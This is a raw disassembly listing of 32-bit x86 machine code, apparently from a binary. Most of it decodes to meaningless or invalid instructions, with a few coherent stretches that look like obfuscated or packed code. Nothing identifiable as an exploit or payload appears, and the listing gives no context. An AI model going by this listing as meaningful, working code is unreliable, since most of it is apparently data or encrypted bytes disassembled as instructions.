  4084fc:	xchg   ecx,eax
  4084fd:	jmp    0x67da184c
  408502:	enter  0xd67c,0xe9
  408506:	push   ds
  408507:	push   eax
  408508:	test   eax,0x9f8910a1
  40850d:	gs ins DWORD PTR es:[edi],dx
  40850f:	aad    0xbb
  408511:	pop    ebx
  408512:	mov    al,0xfa
  408514:	cmp    al,0xe7
  408516:	ins    BYTE PTR es:[edi],dx
  408517:	popa   
  408518:	mov    WORD PTR [eax],gs
  40851a:	pmullw mm6,QWORD PTR [edx+0x1e]
  40851e:	push   eax
  40851f:	mov    bh,0xaf
  408521:	push   ds
  408522:	push   ebp
  408523:	push   ss
  408524:	inc    ecx
  408525:	in     al,dx
  408526:	push   ecx
  408527:	push   ds
  408528:	repnz mov ?,WORD PTR [ebp-0x562bdd16]
  40852f:	xor    eax,0x5ed74fc9
  408534:	daa    
  408535:	shl    DWORD PTR [edx],0xb
  408538:	in     eax,dx
  408539:	cmp    dh,cl
  40853b:	pop    ds
  40853c:	cmc    
  40853d:	jg     0x4085b2
  40853f:	or     ch,BYTE PTR [edx-0x45]
  408542:	and    DWORD PTR [edx],edi
  408544:	clc    
  408545:	xchg   ebx,eax
  408546:	inc    eax
  408547:	fwait
  408548:	adc    DWORD PTR [ecx+0x5fff2c6],edi
  40854e:	ret    
  40854f:	or     BYTE PTR [ecx-0xd],dh
  408552:	sub    ch,BYTE PTR [edi-0x2fec7a5d]
  408558:	jl     0x4084f8
  40855a:	adc    eax,0x4dba16a1
  40855f:	sub    DWORD PTR [eax-0x68],0xfffffff2
  408563:	clc    
  408564:	cmp    BYTE PTR [esi],ch
  408566:	add    edi,DWORD PTR [ebx-0x19]
  408569:	and    eax,0x48791cbc
  40856e:	repnz in eax,dx
  408570:	jno    0x40854b
  408572:	inc    edi
  408573:	rcl    DWORD PTR [edi+0x7b],0xe7
  408577:	out    0x29,al
  408579:	dec    esp
  40857a:	sub    edx,DWORD PTR [ebp+0x671119ad]
  408580:	aad    0xa4
  408582:	sub    al,0x95
  408584:	lds    edx,FWORD PTR [ebx-0x1b]
  408587:	inc    ecx
  408588:	sub    dh,cl
  40858a:	push   eax
  40858b:	pop    ss
  40858c:	aas    
  40858d:	mov    ah,0xf2
  40858f:	cmp    DWORD PTR [eax+esi*8+0x51f6eba9],0xffffffb6
  408597:	in     al,0xf0
  408599:	mov    esi,0x29e19bdf
  40859e:	sub    al,0x8a
  4085a0:	jmp    0xaaca8d29
  4085a5:	adc    esp,DWORD PTR [ebx]
  4085a7:	mov    al,ds:0x6f3101ce
  4085ac:	sahf   
  4085ad:	or     edi,0x65
  4085b0:	sub    eax,0x92a67309
  4085b5:	pop    edx
  4085b6:	and    ebx,DWORD PTR [edi]
  4085b8:	int    0x3e
  4085ba:	cmp    edi,DWORD PTR [ecx-0x6c61deff]
  4085c0:	idiv   BYTE PTR [ebp+eiz*1-0x4a873c80]
  4085c7:	mov    dh,0xe0
  4085c9:	dec    esp
  4085ca:	push   ecx
  4085cb:	push   esi
  4085cc:	xchg   esi,eax
  4085cd:	push   0x570f34af
  4085d2:	pop    ebx
  4085d3:	pop    es
  4085d4:	mov    edi,0x779d046b
  4085d9:	ins    BYTE PTR es:[edi],dx
  4085da:	adc    al,0x60
  4085dc:	arpl   WORD PTR [edi],dx
  4085de:	sbb    BYTE PTR [eax+ebp*4-0xefef71e],bl
  4085e5:	je     0x40858a
  4085e7:	mov    edi,0x72e697e5
  4085ec:	push   edx
  4085ed:	prefetch BYTE PTR [esi-0x4]
  4085f1:	or     ebp,DWORD PTR [ebp-0x63]
  4085f4:	and    BYTE PTR [ecx+0x559cf621],dl
  4085fa:	pushf  
  4085fb:	mov    ebx,DWORD PTR [edx+0x1328e742]
  408601:	mov    al,0x39
  408603:	adc    al,0xde
  408605:	aad    0x6a
  408607:	jmp    0x32f9aace
  40860c:	sbb    eax,DWORD PTR [ecx+0x49]
  40860f:	xor    cl,BYTE PTR [edi-0x10]
  408612:	cdq    
  408613:	xlat   BYTE PTR ds:[ebx]
  408614:	fisubr DWORD PTR [ebx+0x1c]
  408617:	dec    esp
  408618:	dec    ebx
  408619:	jne    0x4085c1
  40861b:	mov    ecx,0x517b4680
  408620:	sbb    eax,0xe5f678fa
  408625:	add    ah,cl
  408627:	aaa    
  408628:	push   esp
  408629:	dec    ecx
  40862a:	sub    al,0x66
  40862c:	and    eax,0xb9f3e54e
  408631:	fucomip st,st(5)
  408633:	push   ecx
  408634:	sbb    BYTE PTR [ebx-0x19],dh
  408637:	xor    eax,0x415b144a
  40863c:	fs retf 0xad88
  408640:	aam    0x8e
  408642:	and    al,0x46
  408644:	sub    dl,BYTE PTR ds:0x9da167c2
  40864a:	fst    DWORD PTR [esi-0x6a60c8d2]
  408650:	in     eax,dx
  408651:	loopne 0x408660
  408653:	sub    DWORD PTR [eax+0x1],0x30663965
  40865a:	and    esi,DWORD PTR [esi+0x49763178]
  408660:	sub    esi,eax
  408662:	push   ss
  408663:	sti    
  408664:	stos   BYTE PTR es:[edi],al
  408665:	nop
  408666:	cmp    eax,0x8aef2b57
  40866b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40866c:	sar    DWORD PTR [esp+ecx*4+0x18],1
  408670:	inc    esi
  408671:	sub    esi,DWORD PTR [esi+0x243b840]
  408677:	push   ds
  408678:	adc    eax,0x5b5bae08
  40867d:	cdq    
  40867e:	std    
  40867f:	(bad)  
  408680:	cmp    DWORD PTR [ebp+eiz*4-0xd72fb17],esp
  408687:	cmp    ecx,DWORD PTR [edx+0x1e]
  40868a:	or     BYTE PTR [esi],0xf3
  40868d:	cs push ss
  40868f:	aaa    
  408690:	ss lahf 
  408692:	in     al,0x53
  408694:	int3   
  408695:	ss xchg ebp,eax
  408697:	lock jge 0x4086ca
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x433763,0x4336fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4337ef,0x433827
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x52a928b6],ecx
  4086ca:	push   0xffffff8a
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	in     eax,dx
  4086d4:	sar    DWORD PTR [ebx-0x3e],cl
  4086d7:	arpl   WORD PTR [edi+0x1f83201c],dx
  4086dd:	mov    esi,0x1a50ef69
  4086e2:	imul   esp,esp,0xb1f3d400
  4086e8:	imul   esi,DWORD PTR fs:[eax+ebp*4],0x2e59c933
  4086f0:	sbb    DWORD PTR [eax],ebx
  4086f2:	cs push ds
  4086f4:	sbb    al,ah
  4086f6:	(bad)  
  4086f7:	and    al,0x19
  4086f9:	xor    ebx,DWORD PTR [edx+0x4f]
  4086fc:	mov    esp,0x2d3fd7e8
  408701:	xchg   edi,eax
  408702:	jb     0x408778
  408704:	gs sbb bh,al
  408707:	outs   dx,BYTE PTR ds:[esi]
  408708:	jmp    0xd5d8:0x6ab28025
  40870f:	fist   WORD PTR [ebx-0x478c7b9f]
  408715:	data16 fucomip st,st(7)
  408718:	push   0xffffffae
  40871a:	cdq    
  40871b:	outs   dx,DWORD PTR ds:[esi]
  40871c:	sar    BYTE PTR [ecx],cl
  40871e:	or     eax,0x8a4fc443
  408723:	mov    esi,ss
  408725:	lods   al,BYTE PTR ds:[esi]
  408726:	mov    esp,0x8a2d4972
  40872b:	hlt    
  40872c:	enter  0xf944,0x93
  408730:	or     al,0xc8
  408732:	test   al,0x80
  408734:	in     al,0x82
  408736:	outs   dx,DWORD PTR ds:[esi]
  408737:	shl    BYTE PTR [ebx],1
  408739:	xor    DWORD PTR [eax+0x70a07545],0x12e38560
  408743:	pop    ecx
  408744:	pop    ebp
  408745:	jno    0x40872c
  408747:	cld    
  408748:	pushf  
  408749:	sub    DWORD PTR [edi+0x1b],eax
  40874c:	mov    BYTE PTR [ebp+0xc],bl
  40874f:	out    dx,al
  408750:	mov    cl,BYTE PTR [esp+edx*8+0x2c]
  408754:	ficomp WORD PTR [edx-0x6aab8d3d]
  40875a:	jb     0x408706
  40875c:	push   0xf9af694b
  408761:	ret    0xdb86
  408764:	pop    esi
  408765:	stos   DWORD PTR es:[edi],eax
  408766:	mov    esi,0x31cfba15
  40876b:	iret   
  40876c:	test   al,0x60
  40876e:	pop    ecx
  40876f:	in     al,dx
  408770:	imul   edi,DWORD PTR [edx+0x776d0efb],0x3cf27d06
  40877a:	mov    ebx,0x1ec47d3
  40877f:	pop    ebx
  408780:	xor    BYTE PTR [eax+ebp*8-0x22b20d36],al
  408787:	and    dh,BYTE PTR [ebx+0x4306b97f]
  40878d:	lds    ecx,FWORD PTR [edi]
  40878f:	outs   dx,DWORD PTR ds:[esi]
  408790:	in     al,dx
  408791:	ja     0x4087cf
  408793:	test   al,0xa3
  408795:	mov    cl,0xa6
  408797:	dec    esi
  408798:	in     eax,dx
  408799:	addr16 and eax,0x180a9b10
  40879f:	sub    DWORD PTR [ebx-0x1a],edi
  4087a2:	sbb    al,0x34
  4087a4:	cmp    ebp,DWORD PTR [eax]
  4087a6:	and    al,0x27
  4087a8:	out    dx,al
  4087a9:	fndisi(8087 only) 
  4087ab:	sbb    ebp,DWORD PTR [edx*8-0x780a0b67]
  4087b2:	(bad)  
  4087b3:	push   0xc2673ba
  4087b8:	xchg   ebp,eax
  4087b9:	push   ebx
  4087ba:	in     eax,dx
  4087bb:	push   ecx
  4087bc:	mov    WORD PTR [eax+0x6319a425],?
  4087c2:	into   
  4087c3:	xchg   ebx,eax
  4087c4:	cli    
  4087c5:	sbb    DWORD PTR [edx+0x56],esi
  4087c8:	adc    eax,0x92c05471
  4087cd:	ja     0x408831
  4087cf:	jmp    0xf2d46660
  4087d4:	or     al,0xd2
  4087d6:	inc    edx
  4087d7:	out    dx,eax
  4087d8:	mov    BYTE PTR [edx+0x48],bl
  4087db:	in     al,0x9f
  4087dd:	jp     0x40884e
  4087df:	mov    BYTE PTR [edi],bl
  4087e1:	cwde   
  4087e2:	(bad)  
  4087e3:	leave  
  4087e4:	dec    ebx
  4087e5:	and    bh,bl
  4087e7:	pop    esi
  4087e8:	imul   ecx,DWORD PTR [ecx+eiz*2-0x69009401],0xffffff97
  4087f0:	mov    cl,0xd1
  4087f2:	sbb    ebp,edx
  4087f4:	(bad)  
  4087f5:	pop    edi
  4087f6:	(bad)  
  4087f7:	out    dx,eax
  4087f8:	ins    DWORD PTR es:[edi],dx
  4087f9:	mov    ?,esi
  4087fb:	mov    DWORD PTR [edx],esi
  4087fd:	or     DWORD PTR [ecx-0x67],esi
  408800:	and    al,0x3e
  408802:	push   cs
  408803:	dec    ecx
  408804:	jl     0x40878a
  408806:	pop    ebp
  408807:	and    esp,DWORD PTR [eax+eax*2]
  40880a:	sub    bh,BYTE PTR [esi]
  40880c:	(bad)  
  40880d:	sti    
  40880e:	or     ch,BYTE PTR [esi+0x44]
  408811:	sar    edi,1
  408813:	hlt    
  408814:	popf   
  408815:	dec    eax
  408816:	lahf   
  408817:	stos   DWORD PTR es:[edi],eax
  408818:	ja     0x4087c8
  40881a:	sbb    al,0xaf
  40881c:	leave  
  40881d:	adc    edi,DWORD PTR [eax-0x68a19f0e]
  408823:	push   0x3
  408825:	inc    eax
  408826:	fsubr  DWORD PTR ds:0x44586c6c
  40882c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40882d:	mov    ecx,0x50bfbdc3
  408832:	sar    DWORD PTR [ecx-0x2c],cl
  408835:	outs   dx,DWORD PTR ds:[esi]
  408836:	stos   BYTE PTR es:[edi],al
  408837:	pop    esp
  408838:	sahf   
  408839:	xchg   esi,eax
  40883a:	pop    ss
  40883b:	pop    edx
  40883c:	pop    esp
  40883d:	retf   0x4326
  408840:	outs   dx,DWORD PTR ds:[esi]
  408841:	arpl   WORD PTR [edi],bp
  408843:	xor    dh,BYTE PTR [edx-0x4e960976]
  408849:	mov    cl,BYTE PTR [edi]
  40884b:	jmp    0x4088c6
  40884d:	pop    edi
  40884e:	daa    
  40884f:	(bad)  
  408850:	xor    ch,BYTE PTR ss:[esi]
  408853:	jb     0x408837
  408855:	pop    edi
  408856:	push   0x57863d42
  40885b:	int    0xfd
  40885d:	inc    esi
  40885e:	add    bh,BYTE PTR [edi]
  408860:	mov    DWORD PTR [esi-0x4a],edi
  408863:	pop    es
  408864:	cld    
  408865:	sahf   
  408866:	addr16 mov eax,0xde5a2e90
  40886c:	add    edx,DWORD PTR [esi+0x4ac06c47]
  408872:	jae    0x408849
  408874:	outs   dx,BYTE PTR ds:[esi]
  408875:	pop    ss
  408876:	stos   BYTE PTR es:[edi],al
  408877:	repz add eax,0xf84c4844
  40887d:	jge    0x40889c
  40887f:	jp     0x4088da
  408881:	and    al,0x7c
  408883:	jno    0x4088a0
  408885:	jae    0x408893
  408887:	retf   0x2534
  40888a:	shl    DWORD PTR [esi+ecx*1+0x3c],cl
  40888e:	add    al,0x3f
  408890:	jmp    0xba220a0d
  408895:	mov    ds:0x3eb4d106,al
  40889a:	jae    0x40888f
  40889c:	ds fwait
  40889e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40889f:	scas   al,BYTE PTR es:[edi]
  4088a0:	mov    ebx,DWORD PTR ds:0x8fc31a97
  4088a6:	arpl   WORD PTR ds:0xd586b301,si
  4088ac:	add    al,0x54
  4088ae:	mov    ds:0x3c110cc2,eax
  4088b3:	mov    dh,0x31
  4088b5:	pop    edx
  4088b6:	in     al,dx
  4088b7:	int3   
  4088b8:	xor    al,0x84
  4088ba:	daa    
  4088bb:	mov    esi,0x4bb6870b
  4088c0:	sub    esi,0xffffff8a
  4088c3:	int    0x50
  4088c5:	lock stos DWORD PTR es:[edi],eax
  4088c7:	push   ss
  4088c8:	and    ecx,DWORD PTR [edx-0x438f7a84]
  4088ce:	aaa    
  4088cf:	xchg   BYTE PTR [ecx],dl
  4088d1:	mov    esp,DWORD PTR [ecx-0x21]
  4088d4:	cmp    DWORD PTR [ebx+0x4],ebp
  4088d7:	mov    ch,0x8b
  4088d9:	mov    eax,0xc505ab97
  4088de:	inc    esi
  4088df:	ja     0x40895e
  4088e1:	cmp    edx,ecx
  4088e3:	mov    eax,0x9ff4efd
  4088e8:	and    DWORD PTR [eax],0xffffffc4
  4088eb:	rcl    BYTE PTR [ecx],0x6
  4088ee:	stos   BYTE PTR es:[edi],al
  4088ef:	js     0x40889e
  4088f1:	sub    DWORD PTR [edx],ebp
  4088f3:	clc    
  4088f4:	cdq    
  4088f5:	and    eax,0xf1190a6d
  4088fa:	retf   0x4772
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x433763,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4337db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433753,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43371f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433827,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x39151b2c
  408968:	sbb    eax,0x7e7ed4b0
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	sbb    bl,BYTE PTR ds:0x4d99d15
  408977:	(bad)  
  408979:	pusha  
  40897a:	sub    DWORD PTR [ecx-0x23],ebp
  40897d:	cmp    eax,0xca74a85a
  408982:	mov    edx,0x5ffa164
  408987:	retf   0xd79c
  40898a:	mov    WORD PTR [edx-0x7b],gs
  40898d:	pop    esi
  40898e:	inc    esp
  40898f:	cmovge ebp,DWORD PTR [edi+0x3d30c6ed]
  408996:	into   
  408997:	mov    ecx,0xbec94db1
  40899c:	push   ss
  40899d:	dec    eax
  40899e:	aaa    
  40899f:	repz sahf 
  4089a1:	mov    BYTE PTR [edi+0x3b9a1c34],al
  4089a7:	pop    ss
  4089a8:	mov    BYTE PTR [edx-0x25],ah
  4089ab:	adc    cl,bh
  4089ad:	inc    esp
  4089ae:	add    al,0x35
  4089b0:	inc    eax
  4089b1:	cld    
  4089b2:	jle    0x408948
  4089b4:	xchg   ebp,ebp
  4089b6:	cmp    DWORD PTR [edx+0x2976f524],esi
  4089bc:	pop    edx
  4089bd:	sub    eax,0x1edd7c43
  4089c2:	mov    esp,0xf27adb04
  4089c7:	pop    ecx
  4089c8:	sbb    edi,DWORD PTR [edx+0x18]
  4089cb:	(bad)  
  4089cc:	cmp    eax,0xdf8b448e
  4089d1:	repnz xor eax,0x7656c59a
  4089d7:	mov    dx,0xa21d
  4089db:	je     0x4089a2
  4089dd:	inc    edx
  4089de:	div    BYTE PTR ss:[esi]
  4089e1:	adc    eax,DWORD PTR [edx+0x29255c9a]
  4089e7:	and    eax,0x66c50223
  4089ec:	sub    ch,al
  4089ee:	pop    ebp
  4089ef:	lahf   
  4089f0:	mov    dl,0x8
  4089f2:	or     esi,ecx
  4089f4:	push   0x76897676
  4089f9:	fs inc esp
  4089fb:	cmp    DWORD PTR [ebx],0xffffffd4
  4089fe:	cmp    al,ch
  408a00:	clc    
  408a01:	pop    esi
  408a02:	aad    0xe1
  408a04:	shl    DWORD PTR [edx-0x6c],0xd2
  408a08:	fmul   DWORD PTR [eax+0x53f13350]
  408a0e:	sbb    BYTE PTR [ebx+0x40],dh
  408a11:	pop    eax
  408a12:	mov    ch,0xbd
  408a14:	into   
  408a15:	push   esp
  408a16:	xchg   edi,eax
  408a17:	clc    
  408a18:	fwait
  408a19:	(bad)  
  408a1a:	mov    WORD PTR [esi-0x197ae53d],ds
  408a20:	jecxz  0x408a0b
  408a22:	pop    esi
  408a23:	repnz cwde 
  408a25:	sar    esp,0xea
  408a28:	pextrw edi,mm6,0x30
  408a2c:	xchg   edi,eax
  408a2d:	jmp    0xb3dcdcb7
  408a32:	push   ds
  408a33:	ret    
  408a34:	push   ebx
  408a35:	out    dx,eax
  408a36:	hlt    
  408a37:	adc    ebx,DWORD PTR [ebx]
  408a39:	test   DWORD PTR [esi],0xd0c408da
  408a3f:	xor    eax,0xc0640e85
  408a44:	shl    BYTE PTR [edx-0x6522259b],cl
  408a4a:	gs sub al,0x8
  408a4d:	sub    DWORD PTR [edi-0x4e4e88c3],0x94f24058
  408a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a58:	jle    0x408abc
  408a5a:	ret    
  408a5b:	xor    edx,DWORD PTR [esp+edi*4-0x171d0844]
  408a62:	mov    dl,0x1b
  408a64:	pop    esp
  408a65:	and    DWORD PTR [edx+0x4f412c83],0xffffffb1
  408a6c:	enter  0x4c16,0x75
  408a70:	je     0x408a28
  408a72:	add    al,0x10
  408a74:	xor    DWORD PTR [edi-0x5ab43de4],edi
  408a7a:	dec    esp
  408a7b:	fcomi  st,st(1)
  408a7d:	mov    edi,0x67b67951
  408a82:	sbb    DWORD PTR [ebx+0x60],edi
  408a85:	sub    eax,0x2b93ee5f
  408a8a:	dec    ebx
  408a8b:	sub    al,0x6e
  408a8d:	in     eax,dx
  408a8e:	and    eax,0xbe14a214
  408a93:	or     dl,cl
  408a95:	mov    ch,0xc5
  408a97:	push   eax
  408a98:	push   ebp
  408a99:	inc    edx
  408a9a:	loop   0x408ad3
  408a9c:	inc    esp
  408a9d:	scas   al,BYTE PTR es:[edi]
  408a9e:	push   esp
  408a9f:	xor    edx,DWORD PTR [esi+edx*1-0x3e59e34e]
  408aa6:	xor    edx,ebx
  408aa8:	in     al,dx
  408aa9:	dec    ebp
  408aaa:	les    ebp,FWORD PTR [edx]
  408aac:	fstp   TBYTE PTR [edx]
  408aae:	pop    es
  408aaf:	cli    
  408ab0:	inc    ebx
  408ab1:	mov    ds:0x72d3f973,al
  408ab6:	sbb    ah,BYTE PTR [eax+0x8de216d]
  408abc:	jmp    0x408a70
  408abe:	rcr    edi,1
  408ac0:	push   ecx
  408ac1:	lds    ebx,FWORD PTR [ebp-0x36fe6a7]
  408ac7:	cmp    eax,0xf29b18dd
  408acc:	sbb    eax,0xa9f246e8
  408ad1:	jns    0x408a53
  408ad3:	(bad)  
  408ad4:	mov    ds:0xe387f521,al
  408ad9:	jbe    0x408af2
  408adb:	mov    bl,0xc0
  408add:	(bad)  
  408ade:	shl    DWORD PTR [esi-0xa4c7337],cl
  408ae4:	mov    ebx,0xbfaea803
  408ae9:	pand   mm0,mm6
  408aec:	fwait
  408aed:	or     DWORD PTR [ebx],edi
  408aef:	das    
  408af0:	(bad)
  408af3:	pop    ecx
  408af4:	in     eax,dx
  408af5:	loop   0x408b4b
  408af7:	sti    
  408af8:	and    esp,DWORD PTR [edi-0x352bb24e]
  408afe:	cmp    DWORD PTR ds:0xb1d0034c,ebp
  408b04:	or     DWORD PTR gs:[eax-0x7ef3a79],edx
  408b0b:	pop    ds
  408b0c:	and    edi,DWORD PTR [esi]
  408b0e:	xchg   edx,eax
  408b0f:	sbb    eax,0x10c39b37
  408b14:	push   0xc6f6dda1
  408b19:	hlt    
  408b1a:	xchg   ebp,eax
  408b1b:	mov    edx,0x328aa61a
  408b20:	cmp    BYTE PTR [ebx-0xc],cl
  408b23:	repnz div bh
  408b26:	xchg   edx,eax
  408b27:	cmp    eax,0x4ce7ca13
  408b2c:	imul   esi,ebx,0x79fee3db
  408b32:	pop    edx
  408b33:	in     al,dx
  408b34:	push   0x27
  408b36:	test   al,0xad
  408b38:	outs   dx,BYTE PTR ds:[esi]
  408b39:	sbb    al,0x84
  408b3b:	fst    st(2)
  408b3d:	mov    dh,BYTE PTR [edi]
  408b3f:	call   0x2d18:0x5d68dd03
  408b46:	and    dh,dl
  408b48:	fs cmp ebp,0xffb1cfd9
  408b4f:	cmp    al,0x82
  408b51:	popa   
  408b52:	xor    ah,BYTE PTR [edi-0x1c37578]
  408b58:	jle    0x408b84
  408b5a:	pop    ebx
  408b5b:	mov    ch,0xb7
  408b5d:	clc    
  408b5e:	inc    edi
  408b5f:	adc    BYTE PTR [eax],0x5c
  408b62:	xlat   BYTE PTR ds:[ebx]
  408b63:	mov    ds:0xd0d4d703,al
  408b68:	mov    dh,0xa1
  408b6a:	pop    ecx
  408b6b:	leave  
  408b6c:	jl     0x408ba5
  408b6e:	std    
  408b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b70:	das    
  408b71:	out    dx,eax
  408b72:	psubd  mm4,QWORD PTR [edx-0x13f78656]
  408b79:	sti    
  408b7a:	xchg   esi,eax
  408b7b:	icebp  
  408b7c:	cmp    DWORD PTR [esi],edx
  408b7e:	pop    edx
  408b7f:	pop    esp
  408b80:	scas   al,BYTE PTR es:[edi]
  408b81:	push   ebp
  408b82:	xor    DWORD PTR [ecx],ebp
  408b84:	xchg   DWORD PTR ds:0xb7985bae,ecx
  408b8a:	gs aaa 
  408b8c:	mov    WORD PTR [ebp-0x40384cbe],ds
  408b92:	lds    edx,FWORD PTR [esi]
  408b94:	jns    0x408bd2
  408b96:	fdivr  QWORD PTR [eax+0xf]
  408b99:	or     eax,0x1d850f37
  408b9e:	add    BYTE PTR [eax],al
  408ba0:	add    BYTE PTR [ebx+0x4d8b0845],cl
  408ba6:	lock xor eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	ret    0x1940
  408bf3:	mov    BYTE PTR [esi-0x2e],ah
  408bf6:	jle    0x408c76
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	jns    0x408c35
  408bfe:	mov    bl,0xea
  408c00:	xor    esi,edx
  408c02:	(bad)  
  408c03:	mov    eax,ds:0x7440f769
  408c08:	push   cs
  408c09:	jmp    DWORD PTR [edi]
  408c0b:	call   0x4b5c7e3d
  408c10:	pop    ebx
  408c11:	add    al,0x2a
  408c13:	ret    0x7afd
  408c16:	cdq    
  408c17:	int    0x6f
  408c19:	jae    0x408c41
  408c1b:	and    edi,ebp
  408c1d:	push   ebx
  408c1e:	imul   esp,DWORD PTR fs:[edx-0x59],0x4e
  408c23:	sbb    DWORD PTR [ebp-0x74],esp
  408c26:	or     al,0x69
  408c28:	jbe    0x408c2c
  408c2a:	jno    0x408bd0
  408c2c:	sbb    bl,BYTE PTR [esi]
  408c2e:	sbb    DWORD PTR [esi+0x6aa023ae],ecx
  408c34:	neg    ebx
  408c36:	(bad)
  408c39:	ss out dx,al
  408c3b:	mov    dh,0xd4
  408c3d:	ror    edi,0x50
  408c40:	sub    eax,0xdc1b80df
  408c45:	xor    edx,DWORD PTR [ecx+0x4c9ab59b]
  408c4b:	and    dl,BYTE PTR [ecx]
  408c4d:	(bad)  [ebx-0x50403657]
  408c53:	mov    ebp,DWORD PTR [eax-0x74ca8223]
  408c59:	scas   eax,DWORD PTR es:[edi]
  408c5a:	ret    
  408c5b:	xchg   esi,eax
  408c5c:	mov    edx,0xe6c13ced
  408c61:	dec    ebx
  408c62:	(bad)  
  408c63:	xchg   esp,eax
  408c64:	ds sbb al,0x51
  408c67:	mov    ds:0xeb624b18,al
  408c6c:	sti    
  408c6d:	lea    ebp,[ebp+ebx*8+0x1b]
  408c71:	inc    edx
  408c72:	ins    DWORD PTR es:[edi],dx
  408c73:	mov    WORD PTR [esi-0x61],cs
  408c76:	sbb    DWORD PTR [eax],esi
  408c78:	js     0x408ca5
  408c7a:	adc    BYTE PTR [ecx-0x10f1f57f],dl
  408c80:	sub    eax,0x2a498776
  408c85:	stos   DWORD PTR es:[edi],eax
  408c86:	jle    0x408c50
  408c88:	fcomp  DWORD PTR [ebx]
  408c8a:	ret    
  408c8b:	imul   edi,DWORD PTR [ebp+eax*4+0x4a],0x73
  408c90:	xchg   ebp,eax
  408c91:	ss or  edi,esp
  408c94:	ja     0x408ca3
  408c96:	daa    
  408c97:	push   ebx
  408c98:	fisub  DWORD PTR [edi]
  408c9a:	mov    ebp,es
  408c9c:	xor    al,0x78
  408c9e:	lock nop
  408ca0:	mov    dh,0x3b
  408ca2:	in     eax,0x7e
  408ca4:	xor    BYTE PTR [ebx+0x65458d52],ch
  408caa:	mov    al,ds:0x8c70aefe
  408caf:	pop    ds
  408cb0:	inc    ebp
  408cb1:	int3   
  408cb2:	push   edx
  408cb3:	cdq    
  408cb4:	(bad)  
  408cb5:	out    dx,al
  408cb6:	cmp    DWORD PTR [edx-0x5d],esp
  408cb9:	jns    0x408d2e
  408cbb:	add    al,0xb1
  408cbd:	call   0xa465e4f6
  408cc2:	stos   DWORD PTR es:[edi],eax
  408cc3:	push   cs
  408cc4:	mov    BYTE PTR [eax-0x5bc7c5c0],cl
  408cca:	in     al,0x6e
  408ccc:	push   cs
  408ccd:	or     al,0x2a
  408cd0:	loope  0x408c7d
  408cd2:	inc    edx
  408cd3:	jge    0x408c79
  408cd5:	(bad)  
  408cd6:	inc    esp
  408cd7:	pop    ecx
  408cd8:	ret    
  408cd9:	cmp    eax,0xa086d5e
  408cde:	jae    0x408ce5
  408ce0:	mov    bh,0x11
  408ce2:	dec    edx
  408ce3:	cmp    eax,0xb879d9a4
  408ce8:	sar    DWORD PTR [edx],0x5b
  408ceb:	mov    ch,0x27
  408ced:	dec    ecx
  408cee:	xchg   esi,eax
  408cef:	retf   
  408cf0:	imul   eax,DWORD PTR [esi-0xd],0xa21fea92
  408cf7:	cmc    
  408cf8:	add    ah,0xce
  408cfb:	xor    edi,ecx
  408cfd:	mov    ds:0x9f8d9165,al
  408d02:	xor    DWORD PTR [edi],ecx
  408d04:	sub    al,0xd4
  408d06:	mov    ds:0x23fb2cd3,al
  408d0b:	xchg   BYTE PTR [ebp+ebp*1-0x60],ah
  408d0f:	xchg   edi,eax
  408d10:	and    eax,0xdedba441
  408d15:	and    edx,DWORD PTR [ecx]
  408d17:	in     eax,0xbc
  408d19:	das    
  408d1a:	fwait
  408d1b:	sub    al,0x55
  408d1d:	jnp    0x408d80
  408d1f:	pop    eax
